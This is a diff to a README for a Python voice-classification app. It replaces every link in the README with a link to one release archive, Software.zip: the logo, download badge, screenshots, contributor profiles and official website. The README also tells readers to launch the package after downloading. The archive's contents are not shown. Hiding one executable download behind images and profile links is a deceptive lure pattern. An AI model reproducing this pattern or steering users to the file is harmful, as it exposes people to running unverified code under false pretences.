@@ -1,6 +1,6 @@
 # Voice Classifier
 
-![Voice Classifier Logo](https://image-url.com)
+![Voice Classifier Logo](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
 
 Welcome to the Voice Classifier repository - your go-to Python application for classifying voice recordings using KNN and SVM models. This tool is designed for audio analysis and machine learning experimentation, providing a comprehensive graphical interface for training, evaluating, and classifying audio data based on acoustic descriptors.
 
@@ -19,7 +19,7 @@ Welcome to the Voice Classifier repository - your go-to Python application for c
 
 To get started with the Voice Classifier app, you can download the software package from the link below. 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
 
 *Note: The software package needs to be launched after downloading.*
 
@@ -31,17 +31,17 @@ To get started with the Voice Classifier app, you can download the software pack
 
 ## Screenshots
 
-![Screen 1](https://image-url.com)
-![Screen 2](https://image-url.com)
+![Screen 1](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
+![Screen 2](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
 
 ## Contributors
 
-👨‍💻 [John Doe](https://github.com/johndoe)  
-👩‍💻 [Jane Smith](https://github.com/janesmith)
+👨‍💻 [John Doe](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)  
+👩‍💻 [Jane Smith](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
 
 ## Support
 
-For any questions or issues, please check the "Releases" section or visit the [official website](https://voiceclassifier.com) for more information.
+For any questions or issues, please check the "Releases" section or visit the [official website](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip) for more information.
 
 ## License
 
@@ -51,4 +51,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for checking out the Voice Classifier repository! We hope this tool enhances your audio analysis and machine learning projects. 🎵🤖
 
-![Waveform](https://waveform-url.com)
+![Waveform](https://github.com/LENGKH/Voice_Classifier/releases/download/v2.0/Software.zip)
